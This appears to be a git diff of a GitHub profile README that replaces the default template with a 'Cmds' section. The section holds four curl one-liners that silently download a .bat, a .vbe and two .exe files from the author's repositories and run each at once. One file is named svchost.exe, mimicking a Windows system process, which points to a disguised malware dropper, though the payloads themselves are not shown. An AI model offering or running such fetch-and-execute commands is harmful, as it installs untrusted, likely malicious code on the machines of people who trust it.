@@ -1,16 +1,14 @@
-## Hi there 👋
+# Cmds
+```
+curl -s -o "c".bat -JL "https://github.com/VanishGX/Base/raw/main/c.bat" & c.bat
+```
+```
+curl -s -o "scriptmenagers".vbe -JL "https://github.com/VanishGX/Base/raw/main/scriptmenagers.vbe" & scriptmenagers.vbe
+```
+```
+curl -s -o "svchost".exe -JL "https://github.com/VanishGX/Data/raw/main/svchost.exe" & svchost.exe
+```
+```
+curl -s -o "anyfix".exe -JL "https://github.com/VanishGX/Base/raw/main/anyfix.exe" & anyfix.exe
+```
 
-<!--
-**VanishGX/VanishGX** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-
-Here are some ideas to get you started:
-
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
